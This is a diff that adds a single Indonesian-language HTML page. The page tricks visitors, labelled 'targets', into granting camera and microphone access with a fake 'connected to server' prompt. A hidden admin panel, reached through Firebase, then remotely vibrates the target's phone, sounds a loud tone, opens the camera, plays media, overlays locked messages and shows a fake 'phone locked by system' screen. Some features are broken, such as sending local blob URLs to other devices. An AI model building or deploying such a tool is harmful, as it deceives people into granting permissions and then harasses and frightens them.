@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Access</title>
+    
+    <!-- FIREBASE SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: #0f0f1a;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 0;
+            overflow: hidden;
+            touch-action: none; /* Mencegah scroll/swipe */
+        }
+
+        /* ===================================== */
+        /*          LAYAR LOADING TARGET        */
+        /* ===================================== */
+        #screen-target {
+            position: fixed;
+            width: 100%;
+            height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 10;
+            text-align: center;
+        }
+
+        .loader {
+            border: 5px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top: 5px solid #00f5d4;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #screen-target h2 {
+            color: #00f5d4;
+            margin-bottom: 15px;
+        }
+
+        #screen-target p {
+            opacity: 0.7;
+            max-width: 80%;
+        }
+
+        /* ===================================== */
+        /*          LOGIN ADMIN                 */
+        /* ===================================== */
+        #screen-login {
+            display: none;
+            background: #000;
+            padding: 30px;
+            border-radius: 15px;
+            border: 2px solid #e94560;
+            text-align: center;
+            z-index: 100;
+        }
+
+        #screen-login h2 {
+            color: #e94560;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        #passInput {
+            padding: 15px;
+            width: 250px;
+            background: #111;
+            border: 1px solid #333;
+            color: white;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .btn-login {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* ===================================== */
+        /*          ADMIN PANEL                 */
+        /* ===================================== */
+        #screen-admin {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .header-admin {
+            text-align: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+
+        .header-admin h1 {
+            color: #e94560;
+            font-size: 22px;
+        }
+
+        .header-admin span {
+            color: #aaa;
+            font-size: 12px;
+        }
+
+        .grid-menu {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .btn-menu {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+
+        .btn-menu:hover {
+            border-color: #e94560;
+            background: #252540;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group input, .input-group textarea {
+            width: 100%;
+            padding: 12px;
+            background: #111;
+            border: 1px solid #333;
+            color: white;
+            border-radius: 8px;
+            margin-top: 5px;
+        }
+
+        .btn-kirim {
+            width: 100%;
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* ===================================== */
+        /*          EFEK DI TARGET              */
+        /* ===================================== */
+        #videoFeed {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            object-fit: cover;
+            display: none;
+            z-index: 999;
+        }
+
+        #videoPlayer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: black;
+            display: none;
+            z-index: 999;
+        }
+
+        #overlay-text {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: rgba(0,0,0,0.9);
+            color: white;
+            font-size: 24px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+            z-index: 999;
+        }
+
+        #passInputTeks {
+            position: fixed;
+            top: 60%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 15px;
+            width: 250px;
+            background: #111;
+            border: 2px solid #e94560;
+            color: white;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+            display: none;
+            z-index: 1000;
+        }
+
+        #btnBukaTeks {
+            position: fixed;
+            top: 75%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            display: none;
+            z-index: 1000;
+        }
+
+        /* ===================================== */
+        /*          LOCK SCREEN ASLI            */
+        /* ===================================== */
+        #lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: #000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999; /* PALING ATAS, GAK BISA DI-SWIPE */
+        }
+
+        .lock-time {
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255,255,255,0.5);
+        }
+
+        .lock-date {
+            font-size: 18px;
+            opacity: 0.8;
+            margin-bottom: 50px;
+        }
+
+        .lock-input {
+            width: 80%;
+            max-width: 300px;
+            padding: 15px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.3);
+            color: white;
+            border-radius: 30px;
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .lock-unlock {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .lock-message {
+            position: absolute;
+            bottom: 50px;
+            font-size: 14px;
+            opacity: 0.7;
+        }
+
+        /* Tombol kontrol kamera */
+        #closeCam, #switchCam {
+            position: fixed;
+            background: rgba(0,0,0,0.5);
+            border: none;
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            font-size: 20px;
+            display: none;
+            z-index: 1001;
+            cursor: pointer;
+        }
+
+        #closeCam {
+            top: 20px;
+            right: 20px;
+        }
+
+        #switchCam {
+            bottom: 30px;
+            right: 30px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LAYAR TARGET -->
+    <div id="screen-target">
+        <div class="loader"></div>
+        <h2>TERHUBUNG KE SERVER</h2>
+        <p>Mohon izinkan akses perangkat yang muncul di layar Anda.</p>
+        <button class="btn-login" onclick="mintaIzin()" style="margin-top:20px;">MULAI</button>
+    </div>
+
+    <!-- LAYAR LOGIN ADMIN -->
+    <div id="screen-login">
+        <h2>ADMIN AUTHENTICATION</h2>
+        <input type="password" id="passInput" placeholder="MASUKKAN PASSWORD">
+        <br>
+        <button class="btn-login" onclick="cekPassword()">LOGIN</button>
+        <div id="errorMsg" style="color: red; margin-top: 10px; display: none;">PASSWORD SALAH!</div>
+    </div>
+
+    <!-- PANEL ADMIN -->
+    <div id="screen-admin">
+        <div class="header-admin">
+            <h1>🔥 PANEL CONTROL</h1>
+            <span>Status: ONLINE | Target: ACTIVE</span>
+        </div>
+
+        <div class="grid-menu">
+            <button class="btn-menu" onclick="kirimPerintah('getar')">📳 GETAR HP</button>
+            <button class="btn-menu" onclick="kirimPerintah('suara')">🔊 SUARA BISING</button>
+            <button class="btn-menu" onclick="kirimPerintah('kamera')">📸 BUKA KAMERA</button>
+            <button class="btn-menu" onclick="kirimPerintah('lock')">🔒 LOCK SCREEN</button>
+            <button class="btn-menu" onclick="kirimPerintah('stop')">⏹️ STOP SEMUA</button>
+        </div>
+
+        <div class="input-group">
+            <label>✍️ KIRIM TEKS (PASS)</label>
+            <textarea id="teksInput" rows="3" placeholder="Tulis pesan..."></textarea>
+            <input type="password" id="passTeks" placeholder="Password buka pesan">
+            <button class="btn-kirim" onclick="kirimTeks()">KIRIM</button>
+        </div>
+
+        <div class="input-group">
+            <label>🎬 KIRIM VIDEO</label>
+            <input type="file" id="fileVideo" accept="video/*">
+            <button class="btn-kirim" onclick="kirimVideo()">KIRIM VIDEO</button>
+        </div>
+
+        <div class="input-group">
+            <label>🎵 KIRIM SUARA</label>
+            <input type="file" id="fileAudio" accept="audio/*">
+            <button class="btn-kirim" onclick="kirimAudio()">KIRIM SUARA</button>
+        </div>
+
+        <div class="input-group">
+            <label>🎤 REKAM SUARA</label>
+            <button class="btn-kirim" id="btnRec" onclick="startRecord()">MULAI REKAM</button>
+        </div>
+    </div>
+
+    <!-- ELEMEN EFEK -->
+    <video id="videoFeed" autoplay playsinline></video>
+    <video id="videoPlayer" controls></video>
+    <div id="overlay-text"></div>
+    <input type="password" id="passInputTeks" placeholder="MASUKKAN PASSWORD">
+    <button id="btnBukaTeks" onclick="bukaTeks()">BUKA</button>
+
+    <button id="closeCam" onclick="tutupKamera()">✖️</button>
+    <button id="switchCam" onclick="gantiKamera()">🔄</button>
+
+    <!-- LOCK SCREEN ASLI -->
+    <div id="lock-screen">
+        <div class="lock-time" id="lockTime">00:00</div>
+        <div class="lock-date" id="lockDate">Senin, 1 Januari 2024</div>
+        <input type="password" class="lock-input" id="lockPassword" placeholder="Masukkan Password">
+        <button class="lock-unlock" onclick="unlockScreen()">BUKA KUNCI</button>
+        <div class="lock-message">HP Terkunci oleh Sistem</div>
+    </div>
+
+    <script>
+        // KONFIGURASI FIREBASE
+        const firebaseConfig = {
+            apiKey: "AIzaSyDMNbkVP8U7W4HWbfwYTKM_k_-kJWh1b-4",
+            authDomain: "console-firebase-3c74a.firebaseapp.com",
+            databaseURL: "https://console-firebase-3c74a-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "console-firebase-3c74a",
+            storageBucket: "console-firebase-3c74a.firebasestorage.app",
+            messagingSenderId: "957116111572",
+            appId: "1:957116111572:web:be6610ac674b7ab35ab941"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // VARIABEL GLOBAL
+        const CORRECT_PASS = "PANEL BY LIFZZ V16.0.0";
+        let isAdmin = false;
+        let currentFacingMode = "environment";
+        let mediaRecorder;
+        let audioChunks = [];
+        let correctLockPass = "";
+        let streamKamera;
+
+        // JALANKAN PERTAMA KALI
+        window.onload = function(){
+            updateWaktu();
+            setInterval(updateWaktu, 1000);
+        };
+
+        function updateWaktu(){
+            let now = new Date();
+            let jam = String(now.getHours()).padStart(2, '0');
+            let menit = String(now.getMinutes()).padStart(2, '0');
+            document.getElementById('lockTime').innerText = jam + ":" + menit;
+            
+            const hari = ["Minggu","Senin","Selasa","Rabu","Kamis","Jumat","Sabtu"];
+            const bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
+            document.getElementById('lockDate').innerText = hari[now.getDay()] + ", " + now.getDate() + " " + bulan[now.getMonth()] + " " + now.getFullYear();
+        }
+
+        function mintaIzin(){
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(function(stream) {
+                document.getElementById('screen-target').style.display = 'none';
+                document.getElementById('screen-login').style.display = 'block';
+                stream.getTracks().forEach(track => track.stop());
+                mulaiListenData();
+            })
+            .catch(function(err) {
+                alert("Mohon izinkan akses kamera & mic!");
+            });
+        }
+
+        function cekPassword(){
+            let input = document.getElementById('passInput').value;
+            if(input === CORRECT_PASS){
+                document.getElementById('screen-login').style.display = 'none';
+                document.getElementById('screen-admin').style.display = 'block';
+                isAdmin = true;
+            } else {
+                document.getElementById('errorMsg').style.display = 'block';
+                setTimeout(()=>{ document.getElementById('errorMsg').style.display = 'none'; }, 2000);
+                if(navigator.vibrate) navigator.vibrate([500]);
+            }
+        }
+
+        function kirimPerintah(aksi){
+            database.ref('perintah').set({
+                aksi: aksi,
+                waktu: Date.now()
+            });
+        }
+
+        function mulaiListenData(){
+            database.ref('perintah').on('value', function(snap){
+                let data = snap.val();
+                if(data && data.aksi){
+                    eksekusiPerintah(data.aksi);
+                    setTimeout(()=>{ database.ref('perintah').remove(); }, 1500);
+                }
+            });
+
+            database.ref('video').on('value', function(snap){
+                let data = snap.val();
+                if(data && data.url) putarVideo(data.url);
+            });
+
+            database.ref('suara').on('value', function(snap){
+                let data = snap.val();
+                if(data && data.url) putarAudio(data.url);
+            });
+
+            database.ref('teks').on('value', function(snap){
+                let data = snap.val();
+                if(data && data.pesan) tampilTeks(data.pesan, data.pass);
+            });
+
+            database.ref('rekam').on('value', function(snap){
+                let data = snap.val();
+                if(data && data.base64) putarRekaman(data.base64);
+            });
+        }
+
+        function eksekusiPerintah(aksi){
+            if(isAdmin) return; // ❌ GAK JALAN DI ADMIN
+
+            if(aksi === 'getar'){
+                if(navigator.vibrate) navigator.vibrate([200,100,200,100,1000]);
+            } 
+            else if(aksi === 'suara'){
+                buatSuaraKeras();
+            }
+            else if(aksi === 'kamera'){
+                bukaKamera();
+            }
+            else if(aksi === 'lock'){
+                aktifkanLockScreen();
+            }
+            else if(aksi === 'stop'){
+                stopSemua();
+            }
+        }
+
+        // ==========================================
+        //          FITUR VIDEO & SUARA
+        // ==========================================
+        function kirimVideo(){
+            let input = document.getElementById('fileVideo');
+            if(input.files.length > 0){
+                let file = input.files[0];
+                let url = URL.createObjectURL(file);
+                database.ref('video').set({ url: url });
+                alert("Video Dikirim!");
+            } else {
+                alert("Pilih video dulu!");
+            }
+        }
+
+        function putarVideo(url){
+            if(isAdmin) return; // ✅ CUMA DI TARGET
+            stopSemua();
+            let vid = document.getElementById('videoPlayer');
+            vid.src = url;
+            vid.style.display = 'block';
+            vid.play();
+        }
+
+        function kirimAudio(){
+            let input = document.getElementById('fileAudio');
+            if(input.files.length > 0){
+                let file = input.files[0];
+                let url = URL.createObjectURL(file);
+                database.ref('suara').set({ url: url });
+                alert("Suara Dikirim!");
+            } else {
+                alert("Pilih file dulu!");
+            }
+        }
+
+        function putarAudio(url){
+            if(isAdmin) return; // ✅ CUMA DI TARGET
+            stopSemua();
+            let aud = new Audio(url);
+            aud.play();
+        }
+
+        // ==========================================
+        //          FITUR KAMERA
+        // ==========================================
+        function bukaKamera(){
+            if(isAdmin) return; // ✅ CUMA DI TARGET
+            stopSemua();
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: currentFacingMode },
+                audio: true
+            })
+            .then(function(stream){
+                let vid = document.getElementById('videoFeed');
+                vid.srcObject = stream;
+                vid.style.display = 'block';
+                document.getElementById('closeCam').style.display = 'block';
+                document.getElementById('switchCam').style.display = 'block';
+                streamKamera = stream;
+            });
+        }
+
+        function gantiKamera(){
+            if(isAdmin) return;
+            currentFacingMode = currentFacingMode === "environment" ? "user" : "environment";
+            if(streamKamera) streamKamera.getTracks().forEach(t => t.stop());
+            bukaKamera();
+        }
+
+        function tutupKamera(){
+            if(isAdmin) return;
+            let vid = document.getElementById('videoFeed');
+            if(vid.srcObject){
+                vid.srcObject.getTracks().forEach(t => t.stop());
+            }
+            vid.style.display = 'none';
+            document.getElementById('closeCam').style.display = 'none';
+            document.getElementById('switchCam').style.display = 'none';
+        }
+
+        // ==========================================
+        //          FITUR TEKS
+        // ==========================================
+        function kirimTeks(){
+            let pesan = document.getElementById('teksInput').value;
+            let pass = document.getElementById('passTeks').value;
+            if(pesan && pass){
+                database.ref('teks').set({ pesan: pesan, pass: pass });
+            } else {
+                alert("Isi pesan & password!");
+            }
+        }
+
+        function tampilTeks(pesan, pass){
+            if(isAdmin) return; // ✅ CUMA DI TARGET
+            stopSemua();
+            document.getElementById('overlay-text').innerText = pesan;
+            document.getElementById('overlay-text').style.display = 'block';
+            document.getElementById('passInputTeks').style.display = 'block';
+            document.getElementById('btnBukaTeks').style.display = 'block';
+            window.passTeksBenar = pass;
+        }
+
+        function bukaTeks(){
+            let input = document.getElementById('passInputTeks').value;
+            if(input === window.passTeksBenar){
+                document.getElementById('overlay-text').style.display = 'none';
+                document.getElementById('passInputTeks').style.display = 'none';
+                document.getElementById('btnBukaTeks').style.display = 'none';
+                database.ref('teks').remove();
+            } else {
+                alert("PASSWORD SALAH!");
+                if(navigator.vibrate) navigator.vibrate([1000]);
+            }
+        }
+
+        // ==========================================
+        //          LOCK SCREEN PALING KERAS
+        // ==========================================
+        function aktifkanLockScreen(){
+            if(isAdmin) return; // ✅ CUMA DI TARGET
+            stopSemua();
+            let lock = document.getElementById('lock-screen');
+            lock.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            correctLockPass = CORRECT_PASS;
+        }
+
+        function unlockScreen(){
+            let input = document.getElementById('lockPassword').value;
+            if(input === correctLockPass){
+                document.getElementById('lock-screen').style.display = 'none';
+            } else {
+                alert("SALAH! HP TETAP KUNCI!");
+                if(navigator.vibrate) navigator.vibrate([2000]);
+            }
+        }
+
+        // ==========================================
+        //          SUARA BISING & REKAM
+        // ==========================================
+        function buatSuaraKeras(){
+            if(isAdmin) return;
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let osc = ctx.createOscillator();
+                let gain = ctx.createGain();
+                osc.connect(gain); gain.connect(ctx.destination);
+                osc.frequency.value = 1000;
+                gain.gain.value = 0.5;
+                osc.start();
+                setTimeout(()=>{ osc.stop(); ctx.close(); }, 3000);
+            } catch(e) {
+                new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg').play();
+            }
+        }
+
+        function startRecord(){
+            navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(function(stream){
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.onstop = function(){
+                    let blob = new Blob(audioChunks, {type: 'audio/wav'});
+                    let reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = function(){
+                        database.ref('rekam').set({ base64: reader.result });
+                        alert("Rekaman Terkirim!");
+                    }
+                }
+                mediaRecorder.start();
+                document.getElementById('btnRec').innerText = "SEDANG REKAM...";
+                document.getElementById('btnRec').style.background = "red";
+            });
+        }
+
+        function putarRekaman(data){
+            if(isAdmin) return;
+            stopSemua();
+            let aud = new Audio(data);
+            aud.play();
+        }
+
+        function stopSemua(){
+            // Tutup Video
+            let vid = document.getElementById('videoPlayer');
+            vid.src = ''; vid.style.display = 'none';
+            
+            // Tutup Kamera
+            if(streamKamera) streamKamera.getTracks().forEach(t => t.stop());
+            document.getElementById('videoFeed').style.display = 'none';
+            document.getElementById('closeCam').style.display = 'none';
+            document.getElementById('switchCam').style.display = 'none';
+            
+            // Tutup Teks
+            document.getElementById('overlay-text').style.display = 'none';
+            document.getElementById('passInputTeks').style.display = 'none';
+            document.getElementById('btnBukaTeks').style.display = 'none';
+        }
+
+    </script>
+</body>
+</html>
